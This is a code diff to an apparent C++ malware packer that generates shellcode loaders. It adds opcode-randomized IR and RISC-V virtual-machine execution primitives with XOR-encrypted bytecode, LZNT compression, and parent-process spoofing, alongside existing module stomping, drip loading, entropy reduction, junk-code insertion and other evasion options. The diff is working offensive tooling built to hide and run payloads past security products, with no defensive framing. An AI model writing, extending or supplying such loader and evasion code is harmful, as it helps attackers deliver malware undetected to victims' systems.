@@ -121,6 +121,8 @@ static std::vector<std::string> get_enabled_tags(const PackerConfig& cfg) {
         case ExecutionPrimitive::APC:      tags.push_back("EXEC_APC"); break;
         case ExecutionPrimitive::Callback: tags.push_back("EXEC_CALLBACK"); break;
         case ExecutionPrimitive::Fiber:    tags.push_back("EXEC_FIBER"); break;
+        case ExecutionPrimitive::VM:       tags.push_back("EXEC_VM"); break;
+        case ExecutionPrimitive::RiscVM:   tags.push_back("EXEC_RISCVM"); break;
     }
 
     // Syscall method
@@ -164,6 +166,7 @@ static std::vector<std::string> get_enabled_tags(const PackerConfig& cfg) {
         case CompressionMethod::Zlib: tags.push_back("COMPRESS_ZLIB"); break;
         case CompressionMethod::LZ4:  tags.push_back("COMPRESS_LZ4"); break;
         case CompressionMethod::RLE:  tags.push_back("COMPRESS_RLE"); break;
+        case CompressionMethod::LZNT: tags.push_back("COMPRESS_LZNT"); break;
     }
 
     // Evasion
@@ -211,15 +214,13 @@ static std::vector<std::string> get_enabled_tags(const PackerConfig& cfg) {
     if (cfg.block_dlls)            tags.push_back("BLOCK_DLLS");
     if (cfg.obfuscate)             tags.push_back("OBFUSCATE");
 
-    if (cfg.module_stomp) {
-        tags.push_back("MODULE_STOMP");
-    } else {
-        tags.push_back("STANDARD_ALLOC");
-    }
-    if (cfg.drip_load) {
-        tags.push_back("DRIP_LOAD");
-    } else {
-        tags.push_back("STANDARD_COPY");
+    bool vm_exec = (cfg.exec_prim == ExecutionPrimitive::VM ||
+                    cfg.exec_prim == ExecutionPrimitive::RiscVM);
+    if (!vm_exec) {
+        if (cfg.module_stomp) tags.push_back("MODULE_STOMP");
+        else                  tags.push_back("STANDARD_ALLOC");
+        if (cfg.drip_load)    tags.push_back("DRIP_LOAD");
+        else                  tags.push_back("STANDARD_COPY");
     }
 
     if (cfg.entropy_reduce)        tags.push_back("ENTROPY_REDUCE");
@@ -260,6 +261,8 @@ GeneratedStub generate_loader(const PackerConfig& cfg,
     std::string crypto_src  = read_file(stubs_dir + "/crypto_stub.hpp.in");
     std::string common_src  = read_file(stubs_dir + "/common.hpp.in");
     std::string evasion_src = read_file(stubs_dir + "/evasion.hpp.in");
+    std::string vm_ir_src    = read_file(stubs_dir + "/vm_ir.hpp.in");
+    std::string vm_riscv_src = read_file(stubs_dir + "/vm_riscv.hpp.in");
 
     // Replace #include directives with actual content (inline everything)
     auto inline_include = [](std::string& src, const std::string& inc_name,
@@ -293,6 +296,8 @@ GeneratedStub generate_loader(const PackerConfig& cfg,
     inline_include(loader_src, "crypto_stub.hpp.in", crypto_src);
     inline_include(loader_src, "common.hpp.in", common_src);
     inline_include(loader_src, "evasion.hpp.in", evasion_src);
+    inline_include(loader_src, "vm_ir.hpp.in", vm_ir_src);
+    inline_include(loader_src, "vm_riscv.hpp.in", vm_riscv_src);
 
     // Replace payload data (apply entropy mask if enabled)
     std::vector<uint8_t> final_payload = encrypted_payload;
@@ -321,6 +326,8 @@ GeneratedStub generate_loader(const PackerConfig& cfg,
                              std::to_string(cfg.sleep_seconds / 2 > 0 ? cfg.sleep_seconds / 2 : 1));
     loader_src = replace_all(loader_src, "{{TARGET_PROCESS}}",
                              cfg.target_process);
+    loader_src = replace_all(loader_src, "{{PPID_PROCESS}}",
+                             cfg.ppid_process);
     loader_src = replace_all(loader_src, "{{ARGUMENTS}}",
                              cfg.arguments);
 
@@ -369,6 +376,102 @@ GeneratedStub generate_loader(const PackerConfig& cfg,
         loader_src = replace_all(loader_src, "{{JUNK_CODE_BLOCKS}}", junk);
     } else {
         loader_src = replace_all(loader_src, "{{JUNK_CODE_BLOCKS}}", "");
+    }
+
+    // Generate VM bytecode if needed
+    auto format_bytes = [](const uint8_t* data, size_t len) -> std::string {
+        static const char hex[] = "0123456789ABCDEF";
+        std::string r;
+        for (size_t i = 0; i < len; i++) {
+            if (i > 0) r += ",";
+            if (i % 16 == 0 && i > 0) r += "\n    ";
+            r += "0x";
+            r += hex[data[i] >> 4];
+            r += hex[data[i] & 0xF];
+        }
+        return r;
+    };
+
+    if (cfg.exec_prim == ExecutionPrimitive::VM) {
+        std::random_device rd;
+        std::mt19937 rng(rd());
+        std::uniform_int_distribution<int> dist(0, 255);
+
+        uint8_t opcodes[4];
+        for (int i = 0; i < 4; ) {
+            uint8_t val = static_cast<uint8_t>(dist(rng));
+            bool dup = false;
+            for (int j = 0; j < i; j++) if (opcodes[j] == val) { dup = true; break; }
+            if (!dup) opcodes[i++] = val;
+        }
+
+        uint32_t ir_seed = rng();
+
+        struct alignas(8) IrOp { uint8_t opcode; uint8_t reserved[7]; uint64_t args[4]; };
+        IrOp ops[4] = {};
+        ops[0].opcode = opcodes[0];
+        ops[1].opcode = opcodes[1];
+        ops[2].opcode = opcodes[2];
+        ops[3].opcode = opcodes[3];
+
+        auto* blob = reinterpret_cast<uint8_t*>(ops);
+        size_t blob_len = sizeof(ops);
+        for (size_t i = 0; i < blob_len; i++) {
+            uint8_t k = static_cast<uint8_t>((ir_seed ^ (i * 0x6D)) & 0xFF);
+            blob[i] ^= k;
+        }
+
+        loader_src = replace_all(loader_src, "{{VM_IR_BLOB}}", format_bytes(blob, blob_len));
+        loader_src = replace_all(loader_src, "{{VM_IR_SEED}}", std::to_string(ir_seed) + "u");
+        loader_src = replace_all(loader_src, "{{VM_IR_OP_ALLOC}}", std::to_string(opcodes[0]));
+        loader_src = replace_all(loader_src, "{{VM_IR_OP_WRITE}}", std::to_string(opcodes[1]));
+        loader_src = replace_all(loader_src, "{{VM_IR_OP_PROTECT}}", std::to_string(opcodes[2]));
+        loader_src = replace_all(loader_src, "{{VM_IR_OP_EXEC}}", std::to_string(opcodes[3]));
+
+        std::cout << "[+] IR VM: opcodes=[" << (int)opcodes[0] << ","
+                  << (int)opcodes[1] << "," << (int)opcodes[2] << ","
+                  << (int)opcodes[3] << "] seed=" << ir_seed << std::endl;
+    }
+
+    if (cfg.exec_prim == ExecutionPrimitive::RiscVM) {
+        std::random_device rd;
+        std::mt19937 rng(rd());
+
+        uint32_t opcode_seed = rng();
+        uint8_t xor_key = static_cast<uint8_t>(rng());
+
+        uint8_t perm[32];
+        for (int i = 0; i < 32; i++) perm[i] = static_cast<uint8_t>(i);
+        uint32_t s = opcode_seed;
+        for (int i = 31; i > 0; i--) {
+            s = s * 1664525 + 1013904223;
+            int j = static_cast<int>((s >> 17) % static_cast<uint32_t>(i + 1));
+            uint8_t tmp = perm[i]; perm[i] = perm[j]; perm[j] = tmp;
+        }
+
+        uint32_t stub[4];
+        stub[0] = 0x00000073; // ecall
+        stub[1] = 0x00300893; // li a7, 3
+        stub[2] = 0x00000513; // li a0, 0
+        stub[3] = 0x00000073; // ecall
+
+        for (auto& inst : stub) {
+            uint32_t op = (inst >> 2) & 0x1F;
+            uint32_t shuffled = perm[op];
+            inst = (inst & ~(0x1Fu << 2)) | (shuffled << 2);
+        }
+
+        auto* code = reinterpret_cast<uint8_t*>(stub);
+        size_t code_len = sizeof(stub);
+        for (size_t i = 0; i < code_len; i++)
+            code[i] ^= (xor_key ^ ((i * 0x67) & 0xFF));
+
+        loader_src = replace_all(loader_src, "{{VM_RV_BLOB}}", format_bytes(code, code_len));
+        loader_src = replace_all(loader_src, "{{VM_RV_SEED}}", std::to_string(opcode_seed) + "u");
+        loader_src = replace_all(loader_src, "{{VM_RV_XOR_KEY}}", std::to_string(xor_key));
+
+        std::cout << "[+] RISC-V VM: opcode_seed=" << opcode_seed
+                  << " xor_key=" << (int)xor_key << std::endl;
     }
 
     // Process conditional blocks
